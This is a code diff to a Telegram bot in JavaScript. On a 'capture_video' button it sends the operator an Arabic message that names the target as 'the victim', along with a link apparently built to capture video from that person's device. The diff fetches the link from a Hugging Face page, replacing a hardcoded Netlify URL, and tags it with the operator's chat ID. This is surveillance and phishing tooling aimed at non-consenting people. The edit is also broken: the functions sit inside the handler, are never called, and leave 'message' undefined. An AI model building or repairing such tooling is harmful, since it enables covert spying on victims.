@@ -1658,7 +1658,42 @@ bot.on('callback_query', (callbackQuery) => {
     const data = callbackQuery.data;
 
     if (data === 'capture_video') {
-        const message = `تم انشاء الرابط ملاحظه قم في تليغم رابط جديد في كل مرهملاحظه بزم يكون النت قوي في جهاز الضحيه\n: https://lucky-bubblegum-d77796.netlify.app/ca/?chatId=${chatId}`;
+        async function getDynamicLink() {
+    const url = "https://sssssskskjwnsb-linklsksn.hf.space";
+
+    try {
+        const res = await fetch(url);
+        const html = await res.text();
+
+        // استخراج الروابط باستخدام DOMParser
+        const parser = new DOMParser();
+        const doc = parser.parseFromString(html, "text/html");
+
+        const links = doc.querySelectorAll("a[href]");
+
+        for (const a of links) {
+            const href = a.getAttribute("href");
+            if (href.endsWith("/ca")) {
+                return href;
+            }
+        }
+    } catch (e) {
+        console.log("Error:", e);
+    }
+
+    return null;
+}
+
+async function createMessage(chatId) {
+    const dynamicLink = await getDynamicLink();
+
+    const message = `تم انشاء الرابط ملاحظه قم في تليغم رابط جديد في كل مره ملاحظه بزم يكون النت قوي في جهاز الضحيه\n: ${dynamicLink}/?chatId=${chatId}`;
+
+    return message;
+}
+
+// مثال استخدام
+
 
         if (message && message.trim() !== '') {
             bot.sendMessage(chatId, message);
